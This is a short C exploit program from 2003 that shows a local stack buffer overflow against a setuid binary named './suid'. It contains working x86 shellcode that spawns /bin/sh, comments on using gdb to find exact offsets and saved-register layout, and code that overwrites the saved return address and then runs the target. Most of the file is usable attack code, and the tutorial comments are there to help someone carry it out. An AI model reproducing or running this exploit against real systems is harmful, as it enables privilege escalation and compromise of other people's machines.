/* 
	(Possibly) The shortest local stack buffer overflow exploit 
	technique using exact offsets.

	A more complex, but perfectly correct version -- without using NOP
	opcodes to handle obscurities like gcc padding.

	Derived from smashing101.tgz
	
	By j00n1x (c) 2003
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>

char shellcode[] = \
	"\x83\xc4\x14\x6a\xb\x58\x99\x52\x68\x6e\x2f\x73" \
	"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1" \
	"\xcd\x80";

// This is the size of the target buffer from %ebp; use gdb disas to
// get this value -- you'd see it in an opcode like "lea 0xfffffef8(%ebp)"
// or similar. (use 2's complement arithmetic to convert to get this value)

#define BUFFERSIZE 264

// Note on new gcc's padding: 
// [16 bytes of padding][target buffer][8 bytes of padding][saved ebp]
// total padding = 24 bytes 
// (but this depends on the amount being allocated as well!)

int main()
{

	int i;
	char buf[2 * sizeof(int) + BUFFERSIZE];
	unsigned int base_address;
	unsigned int *p;

	// do not touch code above

	base_address = 0xdeadbeef; // 1st step (offset crashes program)
//	base_address = 0xbffff9d0; // 2nd step (%esp from gdb core w/ "info reg")

	// do not touch code below

	base_address -= 8; // the value you get from gdb is 2 words
				// off the correct value 
				// because the %esp value is the value of
				// of the stack pointer after ebp and eip.

	// i.e.

	// [padding][target buffer][padding][saved ebp][saved eip][other data]
	//                                                        ^ gdb's esp

	// gdb's esp will point at there because the crash only occurs
	// on the function's return (which means esp has been moved back)

	// when we really want it at:

	// [padding][target buffer][padding][saved ebp][saved eip]
	//                                  ^ our base address

	// which is the base address used in the 'lea' opcodes.

	memset(buf, 0xf4, sizeof(buf)); // 0xf4 = HLT opcode.
					// if we hit this, we know we failed
					// and did not get a perfectly executed
					// overflow.

	memcpy(buf, shellcode, strlen(shellcode));

	// smash over the saved eip

	p = (unsigned int *) (buf+BUFFERSIZE);
	for (i = 0; i < 2; i++) { 
		p[i] = base_address - BUFFERSIZE;
	}

	execl("./suid", "./suid", buf, NULL);
}
